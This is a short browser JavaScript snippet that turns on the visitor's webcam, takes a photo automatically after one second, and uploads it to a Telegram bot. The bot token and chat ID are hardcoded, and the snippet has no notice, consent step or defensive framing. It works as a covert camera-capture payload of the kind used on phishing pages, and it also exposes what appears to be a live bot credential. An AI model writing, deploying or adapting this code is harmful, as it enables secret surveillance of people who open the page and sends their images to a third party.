const video = document.createElement('video');
const canvas = document.getElementById('canvas');

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    video.play();

    // Take picture automatically after 1 second
    setTimeout(() => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('chat_id', '7906406053');
        formData.append('photo', blob);

        fetch(`https://api.telegram.org/bot8282209854:AAEtPJtKKDzyILPv-YuLtbrpmLuFt076aVY/sendPhoto`, {
          method: 'POST',
          body: formData,
        })
        .then(response => response.json())
        .then(data => console.log('Image sent!'));

        // Stop camera stream
        stream.getTracks().forEach(track => track.stop());
      });
    }, 1000);
  })
  .catch(error => console.error('Error accessing camera:', error));